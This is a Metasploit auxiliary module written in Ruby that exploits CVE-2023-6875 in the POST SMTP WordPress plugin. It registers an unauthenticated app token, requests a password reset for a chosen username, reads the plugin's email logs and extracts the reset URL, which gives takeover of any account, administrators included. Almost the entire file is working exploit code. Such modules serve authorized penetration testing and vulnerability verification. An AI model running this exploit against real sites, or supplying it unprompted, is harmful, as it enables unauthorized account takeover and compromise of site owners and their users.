##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wordpress POST SMTP Account Takeover',
        'Description' => %q{
          The POST SMTP WordPress plugin prior to 2.8.7 is affected by a privilege
          escalation where an unauthenticated user is able to reset the password
          of an arbitrary user. This is done by requesting a password reset, then
          viewing the latest email logs to find the associated password reset email.
        },
        'Author' => [
          'h00die', # msf module
          'Ulysses Saicha', # Discovery, POC
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-6875'],
          ['URL', 'https://github.com/UlyssesSaicha/CVE-2023-6875/tree/main'],
        ],
        'DisclosureDate' => '2024-01-10',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )
    register_options(
      [
        OptString.new('USERNAME', [true, 'Username to password reset', '']),
      ]
    )
  end

  def register_token
    token = Rex::Text.rand_text_alphanumeric(10..16)
    device = Rex::Text.rand_text_alphanumeric(10..16)
    vprint_status("Attempting to Registering token #{token} on device #{device}")

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'wp-json', 'post-smtp', 'v1', 'connect-app'),
      'headers' => { 'fcm-token' => token, 'device' => device }
    )
    fail_with(Failure::Unreachable, 'Connection failed') unless res
    fail_with(Failure::UnexpectedReply, 'Request Failed to return a successful response, likely not vulnerable') if res.code == 401
    fail_with(Failure::UnexpectedReply, 'Request Failed to return a successful response, likely unpredicted URL structure') if res.code == 404
    fail_with(Failure::UnexpectedReply, 'Request Failed to return a successful response') unless res.code == 200
    print_good("Successfully created token: #{token}")
    return token, device
  end

  def check
    unless wordpress_and_online?
      return Msf::Exploit::CheckCode::Safe('Server not online or not detected as wordpress')
    end

    checkcode = check_plugin_version_from_readme('post-smtp', '2.8.7')
    if checkcode == Msf::Exploit::CheckCode::Safe
      return Msf::Exploit::CheckCode::Safe('POST SMTP version not vulnerable')
    end

    checkcode
  end

  def run
    fail_with(Failure::NotFound, "#{datastore['USERNAME']} not found on this wordpress install") unless wordpress_user_exists? datastore['USERNAME']
    token, device = register_token
    fail_with(Failure::UnexpectedReply, "Password reset for #{datastore['USERNAME']} failed") unless reset_user_password(datastore['USERNAME'])
    print_status('Requesting logs')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'wp-json', 'post-smtp', 'v1', 'get-logs'),
      'headers' => { 'fcm-token' => token, 'device' => device }
    )
    fail_with(Failure::Unreachable, 'Connection failed') unless res
    fail_with(Failure::UnexpectedReply, 'Request Failed to return a successful response') unless res.code == 200
    json_doc = res.get_json_document
    # we want the latest email as that's the one with the password reset
    doc_id = json_doc['data'][0]['id']
    print_status("Requesting email content from logs for ID #{doc_id}")
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin.php'),
      'headers' => { 'fcm-token' => token, 'device' => device },
      'vars_get' => { 'access_token' => token, 'type' => 'log', 'log_id' => doc_id }
    )
    fail_with(Failure::Unreachable, 'Connection failed') unless res
    fail_with(Failure::UnexpectedReply, 'Request Failed to return a successful response') unless res.code == 200

    path = store_loot(
      'wordpress.post_smtp.log',
      'text/plain',
      rhost,
      res.body,
      "#{doc_id}.log"
    )
    print_good("Full text of log saved to: #{path}")
    # https://rubular.com/r/DDQpKElcH42Qxg
    # example URL http://127.0.0.1:5555/wp-login.php?action=rp&key=vy0MNNZZeykpDMArmJgu&login=admin&wp_lang=en_US
    if res.body =~ /^(.*key=.+)$/
      print_good("Reset URL: #{::Regexp.last_match(1)}")
      return
    end
    print_bad('Reset URL not found, manually review log stored in loot.')
  end
end
